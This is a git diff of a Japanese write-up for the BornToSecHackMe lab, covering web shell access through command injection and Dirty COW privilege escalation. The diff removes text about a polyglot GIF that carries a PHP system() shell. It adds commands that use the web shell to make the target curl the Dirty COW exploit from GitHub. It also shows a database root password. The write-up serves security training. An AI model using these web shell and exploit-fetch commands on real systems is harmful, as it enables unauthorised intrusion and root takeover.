@@ -102,11 +102,6 @@ Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\
 
 ## 5. Web Shell の獲得 (Command Injection)
 
-### 掲示板での画像アップロードと制限の突破
-掲示板機能において、画像ファイルのアップロードを試みたが、GIF形式のファイルを含むいくつかの画像が拒否された。これは主にファイルサイズと画像サイズ (`upload_max_img_width`, `upload_max_img_height`) の制限によるものと判明。特にアバター画像のアップロードでは 80x80 ピクセルの制限があった。
-
-この制限を回避するため、有効な GIF ファイルの構造を模倣しつつ、画像コメント部分にPHPコード (`<?php system($_GET["c"]); ?>`) を埋め込んだポリグロット GIF ファイル (`shell_avatar.gif`) を作成した。
-
 ### phpMyAdmin を利用したファイル書き込み
 入手済みのデータベース `root` ユーザーの認証情報 (`root`/`Fg-'kKXBj87E:aJ$`) を使用し、`phpMyAdmin` にログイン。`SELECT ... INTO OUTFILE` 機能を利用して、Web Shell ファイルを Web サーバーがアクセス可能なディレクトリに直接書き込んだ。
 
@@ -148,16 +143,13 @@ cat /etc/issue
 `/etc/passwd` ファイルを書き換えるタイプの Dirty COW exploit (通称 "Firefart") を使用することにした。
 
 1.  **Exploitコードの転送:**
-    ターゲットマシン上での `curl` による直接ダウンロードが失敗（SSLの互換性やネットワーク制限のため）したため、ローカルでソースコードを Base64 エンコードし、Web Shell を通じてターゲットへ送信する手法をとった。
-
-    **実行コマンド:**
+    ターゲットマシンはインターネット接続が可能であったため、Web Shell 経由で `curl` コマンドを実行し、GitHub から直接ソースコードを取得した。
     ```bash
-    # 1. ローカルでファイルをエンコード
-    B64_DIRTY=$(base64 -w 0 scripts/dirty.c)
+    curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c
+    ```
 
-    # 2. Web Shell 経由でターゲットに送信し、デコードして保存
-    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
-        --data-urlencode "c=echo \"$B64_DIRTY\" | base64 -d > /tmp/dirty.c"
+    ```bash
+    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php"   --data-urlencode "c=curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c"
     ```
 
 2.  **コンパイル:**
